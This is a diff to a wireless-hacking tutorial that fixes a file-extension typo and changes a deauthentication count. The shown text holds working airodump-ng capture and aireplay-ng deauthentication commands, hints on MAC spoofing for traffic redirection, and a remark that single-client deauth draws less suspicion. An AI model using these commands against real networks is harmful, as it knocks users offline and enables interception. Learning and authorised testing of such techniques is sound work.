@@ -113,7 +113,7 @@ sudo airodump-ng --bssid 28:C0:1B:20:05:6B -c 1 -w psk wlan0mon
 ```
 Scanning clients associated with an access point produces a map of all clients connected to the network, this is useful as the MAC address of connected clients can be used in post connection attacks by spoofing your MAC address and redirecting network traffic to your machine.
 
-- The `-w` flag specifies the path location where the `.cap`, `.csv`, `.kismet.csv`, `.kiscmet.netxml`, and `.log.csv` files will be stored.
+- The `-w` flag specifies the path location where the `.cap`, `.csv`, `.kismet.csv`, `.kismet.netxml`, and `.log.csv` files will be stored.
 
 ```
 CH  1 ][ Elapsed: 12 s ][ 2023-06-13 22:08                                                                     
@@ -139,7 +139,7 @@ sudo aireplay-ng --deauth 10 -a 28:C0:1B:20:05:6B wlan0mon
 Deauthenticating one client from an access point is a lot less noisy and does not raise as much suspicion.
 
 ```
-sudo aireplay-ng --deauth 100 -a 28:C0:1B:20:05:6B -c DC:80:84:67:84:4A wlan0mon
+sudo aireplay-ng --deauth 10 -a 28:C0:1B:20:05:6B -c DC:80:84:67:84:4A wlan0mon
 ```
 
 You can change the value for the `--deauth` flag to send more or less deauthentication frames, a value of 0 will continuously send deauthentication packets until the process is stopped.
